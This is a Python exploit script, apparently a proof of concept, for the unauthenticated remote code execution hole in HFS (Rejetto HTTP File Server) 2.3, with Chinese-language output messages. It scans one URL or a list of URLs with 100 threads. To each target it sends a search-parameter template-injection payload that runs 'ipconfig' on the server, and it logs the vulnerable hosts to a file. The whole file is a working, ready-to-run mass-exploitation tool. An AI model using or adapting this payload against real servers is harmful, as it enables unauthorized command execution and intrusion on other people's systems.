import requests,argparse,sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()



def banner():
    banner = """
██╗  ██╗███████╗███████╗
██║  ██║██╔════╝██╔════╝
███████║█████╗  ███████╗
██╔══██║██╔══╝  ╚════██║
██║  ██║██║     ███████║
╚═╝  ╚═╝╚═╝     ╚══════╝                           
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='HFS2.3未经身份验证的远程代码执行漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))

        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):

    url = target+'/?n=%0A&cmd=ipconfig&search=%25xxx%25url:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} '
    headers={
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":"en-US,en;q=0.5",
        "Accept-Encoding":"gzip, deflate, br",
        "Connection":"close",
    }
    res = ""
    try:
        res = requests.get(url,headers=headers,verify=False)

        if res.status_code == 200 and 'rejetto' in res.text:
            print(f"[+]该url{target}存在远程代码执行漏洞")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-]该url{target}不存在远程代码执行漏洞")
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")

if __name__ == '__main__':
    main()